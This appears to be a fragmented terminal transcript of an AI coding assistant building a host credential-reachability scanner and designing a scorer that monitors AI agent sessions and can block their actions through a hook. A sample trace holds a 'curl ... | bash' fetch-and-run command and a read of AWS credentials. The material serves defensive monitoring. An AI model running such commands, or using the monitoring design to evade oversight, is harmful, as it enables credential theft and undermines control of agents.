  Severity ladder: root file readable now → Exposed/Confirmed (misconfig);
  root-only surface present with a detected escalation path → Exposed/Likely;
  surface present with no direct path (kernel-LPE-only) → Notable/Possible;
  nothing sensitive present → Info. Each rung is honest about how conditional
  the reach is.

  Status

  112 tests passing, 0 clippy errors, redaction self-test green against the live
  environment, 75 findings across 30 probe modules. The new probe is value-free
  (labels/counts/status enums only — no path contents), and the docs (§6a
  coverage map + probe table) now describe it and update the earlier "root-only
  files are out of scope" note to reflect that they're covered as conditional
  reachability.

  The blast-radius picture is now end-to-end: as-you reachability → escalation
  paths → post-root reachability → AI narration of the full chain, with the
  privacy contract intact throughout (nothing escalated, no root file read, no
  secret value emitted).

● On it. Two quick notes before I do it, because this is a security tool:
  binding the dashboard to 0.0.0.0 makes it reachable by anyone on the same 
  network, and the page renders your full reachable-credential inventory,
  escalation paths, and post-root blast radius with no authentication —
  effectively a "how to attack this host" map. That's fine if you control the
  network (e.g. demoing from a trusted machine), but I'd avoid it on
  hackathon/conference WiFi. I'll honor the request, make it a --bind flag (so
  you can flip back to loopback), and add a loud warning whenever it's
  non-loopback.

● Done. I added a focused, copy-pasteable RUNNING.md and linked it from the top
  of the README.

  It covers, in order:
  1. Prerequisites — Rust stable, Linux/macOS
  2. Build — cargo build --release (or cargo run -- for dev), plus the npx
  shortcut
  3. Scan — default/offline/verbose, and writing --report/--json/--output files,
  plus compare
  4. Dashboard — full flag table (--port 5321, --bind 0.0.0.0, --no-open, --ai,
  --model, --offline) with the no-auth/network-exposure security warning
  5. AI scenarios — both ways to supply OPENAI_API_KEY (env var or ./.env), and
  the privacy contract (value-free, key never logged)
  6. Useful scan/compare flags — egress, metadata, env, traversal, --fail-on
  7. Exit codes table + a CI-gate example
  8. Verify/develop — cargo test, --features network-tests, self-test-redaction
  9. What it never does — including the "never escalates / never reads root
  files" guarantee

  Everything is checked against the live --help output and the code (e.g.
  default model gpt-4o-mini, port 5321, bind 0.0.0.0, exit codes), so it's
  accurate to the current build. The quick-start one-liner at the top of the
  README is cargo build --release && ./target/release/blastradius dashboard 
  --ai.

  Thought for a couple of seconds                                               
                                                                                
  Yes. I’d make it feel less like a toy “score calculator” and more like an     
  agent risk engine: something that reconstructs what the agent actually did,   
  maps it to sensitive assets, explains the blast radius, and produces a        
  security-grade risk report.                                                   
                                                                                
  Ambitious version                                                             
  Agent Blast Radius Scorer                                                     
                                                                                
  A runtime risk engine that scores every AI agent session based on what the    
  agent touched, changed, executed, and escalated.                              
                                                                                
  Instead of only saying “this session was risky,” it answers:                  
                                                                                
  “What could this agent have impacted if this went wrong?”                     
                                                                                
  That is the real blast radius.                                                
                                                                                
  Core idea                                                                     
                                                                                
  For every agent session, ingest the trace:                                    
                                                                                
  {                                                                             
    "session_id": "abc",                                                        
    "agent": "claude-code",                                                     
    "user": "justin",                                                           
    "repo": "payments-api",                                                     
    "events": [                                                                 
      { "type": "file_read", "path": "~/.aws/credentials" },                    
      { "type": "file_write", "path": ".github/workflows/deploy.yml" },         
      { "type": "shell_command", "command": "curl https://example.com/script.sh 
  | bash" },                                                                    
      { "type": "file_write", "path": "src/auth/session.ts" }                   
    ]                                                                           
  }                                                                             
                                                                                
  Then produce:                                                                 
                                                                                
  {                                                                             
    "session_id": "abc",

      "secrets_exposed": true,                                                  
      "production_deploy_path_modified": true,                                  
      "auth_code_modified": true,                                               
      "network_egress_detected": true,                                          
      "human_approved": false                                                   
    },                                                                          
    "reasons": [                                                                
      "Read cloud credentials at ~/.aws/credentials",                           
      "Modified production deployment workflow .github/workflows/deploy.yml",   
      "Ran shell command with external network access",                         
      "Edited authentication-sensitive code in src/auth/session.ts"             
    ],                                                                          
    "recommended_actions": [                                                    
      "Require security review before merge",                                   
      "Rotate potentially accessed AWS credentials",                            
      "Block deployment until workflow changes are reviewed",                   
      "Open investigation ticket"                                               
    ]                                                                           
  }

  That feels like something security teams would actually want.                 
                                                                                
  The ambitious framing                                                         
                                                                                
  I’d frame it as:                                                              
                                                                                
  Agent Blast Radius Scorer turns raw AI agent activity into a security risk    
  score, impact summary, and recommended response. It gives security teams a    
  way to understand not just what an agent did, but what it could have          
  affected.                                                                     
                                                                                
  Or more punchy:                                                               
                                                                                
  Know the blast radius of every AI agent session.                              
                                                                                
  This is a very strong hackathon project because it is demoable, technically   
  tractable, and maps directly to a real enterprise pain: agents are taking     
  actions across code, secrets, infra, and production paths, but security teams 
  lack a normalized way to score and explain the risk of each session.          

● Short version: this proposal and blastradius are the two halves of one 
  product, and the part the write-up calls "where it gets interesting" (the
  sensitive-asset classifier) is the part we've already built — better than a
  hardcoded list. Reconciling them is mostly reuse, not rebuild.

  The reconciliation

  - blastradius (what we have) = the static map. It answers "what could an agent
  here reach?" — the universe of sensitive assets on this specific machine
  (this AWS profile, this kube context, docker-group→root, this writable
  deploy.yml, the post-root blast radius). That's the denominator: potential
  blast radius.
  - Agent Blast Radius Scorer (the proposal) = the runtime overlay. It answers
  "what did this session actually touch?" — the numerator: realized blast
  radius.

  ▎ One product: score every agent session against the machine's real 
  ▎ reachability map. A read isn't "+30 because it matched ~/.aws/credentials" —
  ▎ it's "+N because blastradius already proved this AWS profile is reachable 
  ▎ and reaches prod, on a host where the agent can escalate to root."

  The proposal's weakest, most generic layer (a regex list: secrets = 
  ~/.aws/credentials, .env…) becomes its strongest: the classifier is a lookup 
  into blastradius findings, so the score is grounded in the actual environment
  instead of a heuristic that's identical on every machine.

  Reuse vs. build

  Proposal layer: Sensitive-asset classifier
  Status: Already built — 30+ probes + finding classes. Map a trace event's
    path/command to the finding(s) it hits.
  ────────────────────────────────────────
  Proposal layer: Blast-radius explainer
  Status: Already built — src/analyze/ + the OpenAI integration. Feed it session

    events → session-specific attack narrative.
  ────────────────────────────────────────
  Proposal layer: Dashboard / report UI
  Status: Already built — src/dashboard/ + page.rs. Add a per-session view.
  ────────────────────────────────────────
  Proposal layer: Value-free / redaction discipline
  Status: Already built — reuse as-is.
  ────────────────────────────────────────
  Proposal layer: Trace ingestion
  Status: New — parse Claude Code session transcripts
    (~/.claude/projects/<repo>/*.jsonl — every Read/Edit/Write/Bash/MCP tool
  call
     is already logged; this is real telemetry, not mock) + a sample
  benign/risky
     trace.
  ────────────────────────────────────────
  Proposal layer: Scoring engine
  Status: New, small — weights × multipliers → score/level, mapping events →
    finding classes.
  ────────────────────────────────────────
  Proposal layer: Live capture + enforcement
  Status: New, optional, high-wow — a Claude Code PreToolUse hook that scores
    each action as it happens and can block above a threshold.

  The ambition unlocks (things only this combo can do)

  1. Escalation-amplified scoring. "Ran a shell command" is +10 generically.
  Here it's multiplied by the host's actual host.privilege_escalation /
  privileged_reachability findings → "ran a shell command on a host where that 
  command can reach root and every host secret." The session score inherits the
  environment's blast radius.
  2. Grounded reasons with evidence. Each reason links to a real finding:
  read_secret → aws.credentials (exposed, reaches 2 prod regions),
  modified_deploy → deferred_exec_sinks (runs in CI outside the sandbox).
  3. Live risk meter + block. A PreToolUse hook streams events to the engine;
  the dashboard shows the score climbing in real time, and the policy layer can
  deny the action — that's the "recommended_actions" turned into actual
  enforcement, which is the demo money shot.
  4. Session attack narrative. The same OpenAI analyzer that today writes "if an
  attacker got code-exec…" now writes "this session read AWS creds → edited
  deploy.yml → ran curl|bash; here's the chained attack that enables" — grounded
  in the actual event order.

  Architecture (reconciled, mostly reuse)

  Claude Code transcript / PreToolUse hook / mock trace
          ↓  src/trace/        (normalize → AgentEvent[])
          ↓  src/score/        (event → finding-class lookup → weighted score ×
  multipliers)
          ↓  src/analyze/      (REUSE: OpenAI → session blast-radius narrative)
          ↓  src/dashboard/    (REUSE + session view: timeline · risk meter ·
  blast map · policy card)
     CLI: `blastradius score traces/risky.jsonl`   ·   Hook: live capture/block

  New surface: a score subcommand and a POST /sessions/analyze route on the
  dashboard server we already run.

  How 2 people split it

  Define the contract first (together, 30 min): the AgentEvent schema and the
  SessionReport JSON (the rich output the proposal ends with — score, level,
  blast_radius, reasons-with-evidence, policy_decision, recommended_actions).
  Once that's frozen, they're independent.

  Person A — Risk engine (the brain). src/trace/ (Claude Code JSONL parser +
  sample benign/risky traces), src/score/ (weights, multipliers, levels, and the
  event→finding-class mapping that reuses the probe inventory), the score CLI
  subcommand, and POST /sessions/analyze. Owns correctness/credibility.
  Deliverable: blastradius score traces/risky.jsonl → full SessionReport.

  Person B — Product, live capture, demo. The dashboard session views (timeline,
  animated risk meter, per-session blast-radius map, reasons list,
  policy/recommended-actions card), wiring the existing OpenAI analyzer to
  produce the session narrative, the PreToolUse hook for live scoring + optional
  block, and the benign-vs-risky demo script (the proposal's Demo 1 / Demo 2 +
  an "approved risky" annotated state). Owns "feels real."

  They meet only at the SessionReport schema — Person B can build the whole UI
  against a static sample report while Person A makes it real.

  Honest caveats (so the demo doesn't bite you)

  - Real source = Claude Code transcripts/hooks. Codex/Cursor "support" is an
  adapter you mock; don't claim live multi-agent ingestion you didn't build.
  - The score's credibility is the grounding, not the numbers. Lead with "this
  read hit a confirmed-reachable prod credential on a root-escalatable host,"
  not "+30."
  - If you wire the blocking hook, exclude your own demo commands or you'll
  deadlock the live demo.

  ---
  If you want, I'll start on the highest-leverage slice now: freeze the 
  AgentEvent/SessionReport schema, add a blastradius score <transcript> 
  subcommand that ingests a Claude Code JSONL session and scores it against a 
  live scan (reusing the classifier + OpenAI), plus one benign and one risky 
  sample trace. That gives both people a working spine to build against within
  the first hour. Want me to go?

  The important upgrade: score combinations, not only events                    
                                                                                
  The original additive scoring is okay for a prototype:                        
                                                                                
  read secrets +30                                                              
  edited deploy files +25                                                       
  network +15                                                                   
  shell +10                                                                     
                                                                                
  But the ambitious version should score toxic combinations.                    
                                                                                
  Examples:                                                                     
                                                                                
  secret reachable + egress open = exfiltration path                            
  ssh-agent reachable + git push likely = source-control mutation path          
  docker group + filesystem visibility = post-root host visibility              
  browser cookies reachable + network open = SaaS session hijack path           
  deploy workflow edited + git write likely = production deployment path        
  auth/payment code edited + human approval absent = high review risk           
                                                                                
  This makes it feel like a real security product because security teams care   
  about paths, not isolated findings.                                           
                                                                                
  Add a score command                                                           
                                                                                
  Something like:                                                               
                                                                                
  blastradius scan --json > baseline.json                                       
  blastradius score --baseline baseline.json --trace traces/risky.json

● Quick read on agent-beacon: it's a Go telemetry tool that's primarily
  hook-based — it installs hooks into Claude Code / Cursor / Codex / opencode /
  vscode / devin (cli/beacon/internal/endpoint/hooks/*.go) and streams a
  normalized runtime.jsonl, rather than passively slurping. But its per-agent
  hook code and normalizer encode exactly the transcript-path conventions we
  need. That's the ground truth to extract.

  For your goal we need both: (1) passive auto-discovery of transcripts from
  well-known dirs, and (2) correlating what agents already did in those
  transcripts against the currently reachable dangerous credentials — with a
  hard new privacy problem (transcripts contain secret values, unlike everything
  blastradius reads today).

  Let me launch a workflow to design this, grounded in the cloned repo.

● Workflow(Design auto-discovery of agent transcripts + retro-hazard correlation
          against reachable creds, grounded in agent-beacon)
  ⎿  /workflows to view dynamic workflow runs

● Both workflows are now running in the background (the earlier SPEC-reconcile
  one and this transcript-ingestion design). They're independent and will each
  notify me on completion.

  While they run, here's what the agent-beacon recon already surfaced about how 
  it identifies transcripts:

  - It's hook-first, not a passive slurper. beacon installs per-agent hooks
  (cli/beacon/internal/endpoint/hooks/{claude,cursor,opencode,vscode,devin}.go)
  that emit a normalized runtime.jsonl as the session runs — e.g. it writes
  .claude/settings.local.json to register Claude Code hooks, and prints
  .cursor/hooks.json for Cursor Cloud. So its "identification" is mostly
  configuring the agent to report, plus knowing each agent's transcript-path
  convention (it references /path/to/transcripts/<uuid>.jsonl, ~/.claude,
  ~/.codex, ~/.cursor, and COPILOT_OTEL_FILE_EXPORTER_PATH for Copilot).
  - The reusable part for us is the per-agent path/format knowledge in those
  hook files + the normalizer.go that maps each agent's event shape into one
  schema — which is exactly the discovery registry + AgentEvent normalization we
  want, but done passively over the on-disk transcripts (e.g. Claude Code's
  ~/.claude/projects/<encoded-cwd>/<session-uuid>.jsonl) instead of via hooks.

  The design workflow is fanning out on four slices — auto-discovery/parsing,
  the retro-hazard join (historical actions × currently-reachable findings →
  "this already happened and still matters"), privacy, and CLI/dashboard 
  surfacing — each adversarially reviewed, with the reviewers told to treat any
  path that lets transcript secret values reach a report as a defect. That's the
  central new risk: unlike everything blastradius reads today, transcripts are
  full of secrets the agent saw, so the slurper must extract actions only
  (classified paths, command shapes, hosts) and never content.

  I'll pick both up automatically as they complete — applying the SPEC edits
  from the first, and writing the ingestion design doc (plus surfacing open
  decisions) from the second. You can watch either with /workflows.

  What landed

  New §23 — "Session blast-radius scoring layer (runtime overlay)" frames the
  whole thing as a numerator over the existing denominator: it adds no new probe
  and no new regex list — the classifier is the JOIN of observed AgentEvents
  against the real §11–§12 findings. It specifies the frozen
  AgentEvent/SessionReport contracts, the src/session/ module layout, the
  deterministic scoring (weights × multipliers × escalation amplifier), the
  toxic-combination catalog (6 named security paths, each keyed to real finding
  IDs), the containment simulator (§15 made quantified — the 96→61→48→42→28→11
  ladder), the three-tab dashboard, the CLI (score, --fail-on-score, the
  PreToolUse --hook), the two-person split, the demo script, and a
  reconciliation-map table.

  The adversarial pass earned its cost — real defects it caught and fixed before
  they shipped into the spec:
  - A canary-test leak vector: a non-pattern secret planted in the retained
  shell_command field would have slipped past both layers; fixed to a fixture
  that exercises dropped fields (Layer 1) and the retained-command case
  (Layer 2).
  - approval.reason (human free-text) was missing from the redaction sweep — a
  real leak path, now closed.
  - Removed invented finding IDs, pinning every JOIN/suppression/evidence ref to
  IDs verified in src/probes.
  - Resolved an exit-code conflict (one slice invented code 5; unified on
  reusing 4).
  - Fixed a no_ssh_agent over-claim (it doesn't by itself lower
  git.push_likelihood) and keyed the escalation amplifier to actual baseline
  presence, not rule activation.

● Both workflows are now integrated. SPEC.md now carries §23 (scoring layer) + 
  §24 (transcript ingestion + retro-hazard) — ~138KB, all headings normalized,
  90 balanced code fences, zero escaping artifacts. Temp scripts and the clone
  are in /tmp.

  What §24 says — the headlines

  How agent-beacon identifies transcripts (your question): it's hook/OTLP-based 
  and does not glob — it receives transcript_path from each agent's hook payload
  (only Antigravity gets a beacon-constructed on-disk path). So its reusable
  value isn't discovery; it's the per-agent config-dir conventions (harness.go 
  DiscoverAll), the line-format parsers (stop.go), and the action taxonomy
  (actionForTool). blastradius supplies the passive globs itself.

  Auto-slurp — a data-driven discovery registry (mirroring probes/store.rs) for
  14 agents, each with a glob, format, and confidence: Claude Code
  (~/.claude/projects/<enc-cwd>/<uuid>.jsonl, high), Codex
  (~/.codex/sessions/Y/M/D/rollout-*.jsonl, high), Copilot, Cursor CLI/IDE,
  opencode (per-message JSON dir), Gemini/Antigravity, Factory, Devin/Windsurf,
  Aider (Markdown), etc. Cross-platform via a Root enum (probes both XDG + macOS
  roots, no cfg! forks); SQLite/IDE sources feature-gated off.
  Detectable-but-unparsable sources report DetectedUnparsed so an empty slurp is
  visibly empty, never silent.

  Retro-hazard (the product) — reuses the §23 six toxic-combination rules
  unchanged, joins each historical session against today's baseline, and keeps a
  hazard only if ≥1 activated finding still fires now at ≥Notable. The
  asymmetry is the whole claim: "3 days ago session X read ~/.aws/credentials 
  then ran external curl — and aws.credentials.profiles + egress.connectivity 
  are still reachable" scores ~96; if those creds were rotated since, it's
  demoted to a "RemediatedSince" ledger.

  The critical privacy finding — unlike everything blastradius reads today,
  transcripts contain secret values (the agent's tool_result is the file it
  read). agent-beacon's "copy content + regex-redact + retention=full" model is
  named as the exact defect to reject. The design adds a Layer-0 extractor
  (upstream of §23.4) that reads allowlisted keys only and never touches
  tool_result; a mandatory §24.8a path/url shape gate (the highest-risk channel:
  a Markdown/SQLite parser lifting a secret into a path/server field that
  bypasses Layer-1); allowlist-by-default argv reduction (every token redacted
  unless it positively matches a structural class — so a low-entropy hunter2
  paste is redacted, which an entropy gate would miss); and a canary self-test
  planting secrets in every discard/retain vector.

  Decisions that need you (it deliberately didn't assume)

  1. Dashboard bind — now the third flag. §24 recommends defaulting to 127.0.0.1
  when --history is set, because Tab 4 literally publishes which 
  still-reachable creds an agent read — a precise LAN targeting map. Your
  0.0.0.0 default is untouched in code. Per-mode loopback override, or global
  flip, or keep 0.0.0.0?
  2. CLI shape conflict (unresolved across slices): dedicated sessions /
  audit-history verbs (adopted as primary) vs. folding under score --slurp. Both
  are greenfield; pick one.
  3. Ranking constants (combo_base 40/25/15, reach-factor ladder, 14-day
  half-life, ×2.5) aren't in the brief — freeze with fixtures.
  4. --state cursor introduces new on-disk state (offsets/inode-ids only, no
  content) — §22 lists persisted history as not-required; approve or keep
  default-off.
  5. Unverified globs (Cursor CLI, Copilot, Gemini, opencode layout) are
  runtime-sniffed, not asserted — need real-machine confirmation before trusting
  them.

  Nothing is committed. Want me to commit both SPEC sections (§23 + §24), and
  what's your call on the bind default and the CLI shape?

  Where we are vs. spec & design goals

  Bottom line: the MVP — the reachable-surface inventory that §22 defines as the
  actual contract — is complete and substantially exceeded. The ambitious 
  design layers (§23 scoring, §24 ingestion/retro-hazard) are spec-complete but 
  0% implemented (correctly marked post-MVP). One material conformance
  regression has crept in: the dashboard now loads code from a CDN, which breaks
  the spec's central "nothing leaves your machine / offline" promise.

  Verified now: cargo build clean · 117 tests, 0 failures · 0 clippy errors · 30
  probe modules · src/session/ and score absent (as §24.0 states) · redaction
  self-test green.

  §1–§22 (the MVP contract) — DONE, and well past spec

  Beyond spec, you also shipped things the original SPEC didn't even list:
  privilege-escalation + post-root reachability, ptrace/memory introspection,
  browser stores, localhost-service reach, gpg-agent, the AI attack-scenario
  dashboard. The MVP isn't just met — it's the strongest part.

  §23 / §24 (design goals) — spec-complete, unbuilt

  - §23 session scoring layer — 0% code. src/session/, the score command, the
  JOIN engine, toxic-combination catalog, containment simulator: all frozen
  contracts in the SPEC, nothing in the tree.
  - §24 transcript ingestion + retro-hazard — 0% code. Discovery registry,
  parsers, the retro join, the Layer-0/§24.8a value-free gate: design only.

  This is honestly labeled (we fixed §6/§8/§11 last turn). So "how close to the
  design goals": the design is done; the implementation hasn't started.
  Realistic first slice is still the same: freeze AgentEvent/SessionReport,
  build src/session/ + score against the two checked-in fixtures.

  ⚠ The one real conformance gap to decide on

  The dashboard now pulls React + ReactDOM from unpkg.com and webfonts from 
  Google Fonts (src/dashboard/page.rs:21–124). This collides with three
  load-bearing spec claims that are still asserted verbatim:

  - README/§4: "no network except the documented egress probe and the opt-in 
  --ai call" — the browser now also fetches executable JS from a third-party
  CDN.
  - "self-contained… works offline" — it no longer renders offline.
  - The tool's whole thesis is "nothing leaves your machine," yet a page
  rendering your full credential-reachability map now executes remote JS from
  unpkg — a supply-chain path straight to the data the tool exists to protect
  (made worse by the 0.0.0.0 no-auth default).

  I did not touch it (the change was intentional). But it's an internal
  contradiction either way, so it needs a call:
  1. Re-inline the assets (vendor React + fonts into the page) — restores
  offline/no-network/self-contained and keeps the spec true; or
  2. Keep the CDN and update the README + SPEC §4 to admit a third browser-side
  network path and drop the "offline/self-contained" claim.

  My recommendation is (1) — for this specific product, a self-contained
  dashboard is a feature, not a limitation, and it's the only way the "nothing
  leaves your machine" promise survives contact with the dashboard.

  Net: ~100% of the MVP spec, 0% of the §23/§24 design implementation, and one
  CDN regression to resolve. Want me to re-inline the dashboard assets, or start
  the §23 score slice?

  --offline/--no-egress/--egress-url/--check-metadata machinery ("I don't care
  about the no-egress stuff. Too complex. Get rid of it.") — so the "no creds

  network) rather than via a bunch of egress-control code.

  Concretely, I'm:
  1. Deleting the two egress probes (egress.rs, egress_mediation.rs) + their
  network helper (util/net.rs) + the rustls/webpki deps.

  config struct (NetworkPolicy → renamed ScanOptions, keeping only
  env_broad/verbose) and from the report.

  --offline). The tree is mid-refactor and won't build right now until I finish
  the test edits.

      1260  **The hard constraint (bigger than anything blastradius reads

            ssifications, counts) and must prove by self-test that no tra

            ding` evidence, report, dashboard payload, or `--ai` send. An

      1570  - False-positive over-claim: §23.8 rules assert co-occurrence
             within a session, not causation; a credential read at minute
             1 and an unrelated curl at minute 40 still activate exfiltra
            tion_path. Current-reachability gating + recency + the Remedi
            atedSince asymmetry + the directory-prefix join-tightening mi
            tigate but do not eliminate it; the wording boundary (compose
            s/still-reachable, never 'exfiltrated', path clause only when
             exit_in_session or a combo actually fired) is load-bearing a
            nd must be enforced in headline templating.
      1571  - Dashboard exposure: Tab 4 publishes which still-reachable c
            redentials an agent actually read — a precise LAN targeting m
            ap — and the dashboard default bind is 0.0.0.0 with no auth, 
            always. Mitigated by the extended no-auth warning on any non-
            loopback bind (and by `--bind 127.0.0.1` to restrict to loopb
            ack); without the warning this becomes a network-exposed targ
            eting service.
      1572  - Silent-empty discovery read as safety: wrong/absent globs, 
            macOS vs Linux IDE divergence, ctx.home None, or OTEL-only ag
            ents yield zero sessions; without the opt-in banner + per-sou
            rce found:0 summary + 'agent configured but 0 transcripts par
            sed' diagnostics, an operator reads absence-of-evidence as ev
            idence-of-absence.

         -on, prompt injection, executing untrusted repo code, running pa

         -dings anywhere, brute-forcing, probing third-party infra, bypas
         -sing branch protection, real or dry-run `git push`, or retrievi
         -ng cloud-metadata credentials. It only asks: what is reachable?

         -nly by default (§4.1) and value-free (§4.2); its single state-c
         -hanging capability is the **opt-in** PreToolUse `block` decisio
         -n, which the user must explicitly enable. The scorer never exec
         -utes session commands, never replays traced actions, and never 
         -emits secret values — `file_write` diffs and `mcp_call` inputs 
         -are dropped/redacted at ingest, command secret-substrings strip
         -ped — and every `SessionReport` will be required to pass the sa
         -me Layer-2 redaction sweep (§4.3) and canary self-test (§4.4) a
         -s every other renderer (this is the contract for the §23 layer,
         - which is post-MVP and not yet built — §24.0; the current self-
         -test covers the terminal/markdown/json/dashboard renderers only
         -).
